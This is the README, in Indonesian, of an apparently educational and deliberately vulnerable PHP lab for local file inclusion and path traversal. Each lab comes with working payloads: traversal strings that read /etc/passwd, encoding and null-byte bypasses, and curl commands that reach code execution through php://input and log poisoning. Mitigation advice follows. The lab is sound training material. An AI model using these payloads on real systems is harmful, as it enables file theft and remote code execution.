# Local File Inclusion (LFI) / Path Traversal Lab

Aplikasi PHP sederhana yang sengaja rentan terhadap Local File Inclusion & Path Traversal,
mengikuti kategori PortSwigger Web Security Academy **File path traversal** (5 variasi filter
bypass) ditambah **LFI-to-RCE** lewat PHP stream wrapper dan log poisoning.

| Lab | Kategori (PortSwigger) | File | Parameter |
|---|---|---|---|
| 1 | File path traversal, simple case | `lab1_basic.php` | `page` (GET) |
| 2 | Traversal sequences blocked with absolute path bypass | `lab2_absolute_bypass.php` | `page` (GET) |
| 3 | Traversal sequences stripped non-recursively | `lab3_nonrecursive_strip.php` | `page` (GET) |
| 4 | Traversal sequences stripped with superfluous URL-decode | `lab4_double_decode.php` | `page` (GET) |
| 5 | Validation of start of path | `lab5_start_validation.php` | `page` (GET) |
| 6 | Validation of file extension with null byte bypass | `lab6_extension_nullbyte.php` | `page` (GET) |
| 7 | LFI to RCE (PHP wrappers & log poisoning) | `lab7_wrappers_rce.php` | `page`, `cmd` (GET) |

> ⚠️ **PERINGATAN**: Aplikasi ini sengaja rentan dan Lab 7 benar-benar bisa mencapai eksekusi
> kode (RCE) di dalam container lewat `php://input` dan log poisoning. Jangan deploy ke server
> publik / internet. Jalankan hanya di jaringan lab/lokal yang terisolasi. Container dijalankan
> dengan kapabilitas Docker default (tidak ada `--privileged`), jadi dampaknya terbatas pada isi
> container itu sendiri.

## Menjalankan

> Lab ini adalah bagian dari satu stack terpadu. Jalankan dari **root repo** (bukan dari
> folder ini), lihat [README.md utama](../README.md) untuk portal navigasinya.

```bash
cd ..            # ke root repo
docker compose up -d --build
```

Buka langsung `http://localhost:8079/lfi/`, atau lewat Portal di `http://localhost:8079/` →
kategori **A05: Injection** → **Local File Inclusion (LFI)**.

> Semua akses lewat `gateway` (login Basic Auth, satu port untuk semua lab) — lihat
> [README.md utama](../README.md) bagian "Menjalankan (lokal)" untuk cara generate
> kredensialnya. Login cukup sekali, berlaku juga untuk lab SQLi/XSS/Command Injection/File
> Upload.

## Panduan tiap lab

### Lab 1 — Basic LFI (simple case)
`include($_GET['page'])` mentah, tanpa validasi apa pun.
```
?page=../../../../etc/passwd
?page=../secret/config.php
```

### Lab 2 — Traversal Diblokir, Absolute Path Lolos
Filter hanya mencari substring `../` pada input dan menolaknya kalau ada — tidak menyadari
bahwa path absolut sama sekali tidak butuh `../`.
```
?page=/etc/passwd
```

### Lab 3 — Traversal Sequence Dihapus Non-recursive
`str_replace('../', '', $input)` hanya menghapus satu lapis. Sisipkan karakter ekstra supaya
setelah satu kali penghapusan, hasilnya tetap `../`.
```
?page=....//....//....//....//etc/passwd
```

### Lab 4 — Filter Lalu URL-decode Berlebih
Filter traversal dijalankan duluan, baru input di-`urldecode()` sekali lagi setelahnya.
Double-encode payload supaya lolos filter, lalu "muncul" setelah decode kedua.
```
?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Lab 5 — Validasi Hanya di Awal Path
Aplikasi hanya mengecek bahwa input **dimulai** dengan `pages/`, tanpa menormalisasi hasil
akhirnya.
```
?page=pages/../../../../etc/passwd
```

### Lab 6 — Validasi Ekstensi dengan Null Byte Bypass
Validasi hanya mengecek bahwa input **berakhiran** `.png`. Sisipkan null byte di antara path
target dan ekstensi palsu.
```
?page=../../../../etc/passwd%00.png
```
> Catatan: ini teknik **historis** (bug asli PHP < 5.3.4, sudah dipatch). Kode lab ini secara
> sengaja mensimulasikan perilaku lama tersebut supaya tekniknya tetap bisa dipelajari.

### Lab 7 — LFI to RCE (PHP Wrappers & Log Poisoning)
Tiga teknik meningkatkan LFI murni jadi eksekusi kode:

**a. Source code disclosure via `php://filter`** (meng-include `.php` langsung akan
mengeksekusinya, bukan menampilkan source-nya):
```
?page=php://filter/convert.base64-encode/resource=pages/secret_notes.php
```

**b. RCE via `php://input`** (body request dieksekusi sebagai kode PHP):
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://localhost:8079/lfi/lab7_wrappers_rce.php?page=php://input&cmd=id"
```

**c. Log poisoning** (header `User-Agent` dicatat mentah ke `app_data/access.log` di setiap
request, lalu file log itu di-include):
```bash
curl -s -A '<?php system($_GET["cmd"]); ?>' "http://localhost:8079/lfi/index.php" > /dev/null
curl -s "http://localhost:8079/lfi/lab7_wrappers_rce.php?page=../app_data/access.log&cmd=id"
```

## Mitigasi (untuk didiskusikan setelah lab)
- **Hindari `include()`/`require()` dinamis berbasis input pengguna sama sekali** bila
  memungkinkan. Kalau harus, gunakan **allowlist** nilai yang diizinkan secara eksplisit (mis.
  `match($page) { 'home' => 'pages/home.php', 'about' => 'pages/about.php', ... }`), bukan
  membangun path dari input mentah.
- Kalau memang perlu membaca file berdasarkan nama dari pengguna, gunakan `basename()` untuk
  membuang seluruh komponen direktori dari input, lalu gabungkan dengan direktori dasar yang
  tetap (fixed base directory) — jangan andalkan blacklist karakter (Lab 2–5 semuanya adalah
  variasi blacklist yang gagal).
- Validasi hasil akhir dengan `realpath()` dan pastikan hasilnya benar-benar berada **di
  dalam** direktori yang diizinkan (`str_starts_with(realpath($target), realpath($base_dir))`),
  bukan sekadar mengecek string mentahnya sebelum di-resolve (Lab 5).
- Nonaktifkan `allow_url_include` (default sudah `Off` di PHP modern) supaya wrapper seperti
  `php://input` dan URL remote tidak bisa dipakai lewat `include()`/`require()` (Lab 7).
- Jangan tampilkan pesan error mentah (`display_errors`) di production — path lengkap yang
  bocor lewat warning `include()` mempermudah reconnaissance penyerang.
- Simpan file rahasia/konfigurasi di luar webroot **dan** pastikan aplikasi tidak bisa
  meng-include-nya berdasarkan input pengguna — dua lapis pertahanan sekaligus, bukan hanya
  mengandalkan salah satunya.
- Jalankan proses web server dengan **least privilege** (user non-root, read-only di mana
  memungkinkan) agar dampak LFI-to-RCE tetap terbatas pada isi container.
